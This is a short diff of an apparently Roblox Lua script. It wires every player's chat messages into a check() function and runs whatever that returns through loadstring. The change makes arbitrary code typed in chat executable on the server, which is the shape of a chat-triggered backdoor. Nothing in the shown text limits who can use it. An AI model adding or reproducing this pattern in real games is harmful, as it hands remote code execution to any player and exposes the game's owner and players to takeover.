@@ -10,11 +10,13 @@ function check(inputString)
 end
 
 for _, plr in pairs(game.Players:GetPlayers()) do
-    local CHECK = check(msg)
+    plr.Chatted:Connect(function(msg)
+        local CHECK = check(msg)
     
-    if CHECK then
-        loadstring(CHECK)()
-    end
+        if CHECK then
+            loadstring(CHECK)()
+        end
+    end)
 end
 
 game.Players.PlayerAdded:Connect(function(plr)
